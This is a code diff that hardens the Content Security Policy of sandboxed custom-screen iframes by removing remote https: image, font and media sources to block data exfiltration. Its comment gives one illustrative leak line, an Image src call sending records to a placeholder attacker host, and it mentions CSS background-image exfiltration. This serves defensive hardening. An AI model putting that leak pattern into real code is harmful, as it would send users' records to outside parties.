@@ -1,13 +1,19 @@
 // Shared hardening for the sandboxed custom-screen runtimes (form + app).
 
 // CSP applied INSIDE the screen's iframe. The SDK talks to the parent via postMessage (not affected by
-// CSP), so the screen needs no network of its own: connect-src 'none' blocks fetch/XHR/websocket/beacon
-// (no data exfiltration), default-src 'none' blocks plugins/objects, base-uri/form-action 'none' prevent
-// base-tag and form hijacking. Inline script/style are allowed (that's the screen's own code); images and
-// fonts may load over https/data for visuals.
+// CSP), so the screen needs no network of its own. The policy is deliberately NO-EGRESS: a screen can
+// read records through the FormLogic SDK, so ANY outbound request is a data-exfiltration channel.
+//   - connect-src 'none'    → blocks fetch/XHR/WebSocket/sendBeacon.
+//   - img/font/media limited to data:/blob: (local only) → blocks the classic `new Image().src =
+//     'https://attacker/?d='+records` leak AND CSS `background-image:url(https://…)` exfil. NO remote
+//     https: hosts — custom screens must inline/data-URI any imagery; there are no remote webfonts.
+//   - default-src 'none'    → blocks plugins/objects/prefetch/etc.
+//   - base-uri/form-action 'none' → prevents <base> and form-submission hijacking.
+// If you ever need real assets in a screen, add a controlled FormLogic asset mechanism — never widen
+// this to `https:`. See docs/CUSTOM_SCREEN_DASHBOARD_KIT.md ("no remote images/fonts/media").
 export const SCREEN_CSP =
   "default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; "
-  + "img-src data: https:; font-src data: https:; media-src data: https:; "
+  + "img-src data: blob:; font-src data:; media-src data: blob:; "
   + "connect-src 'none'; base-uri 'none'; form-action 'none'";
 
 /**
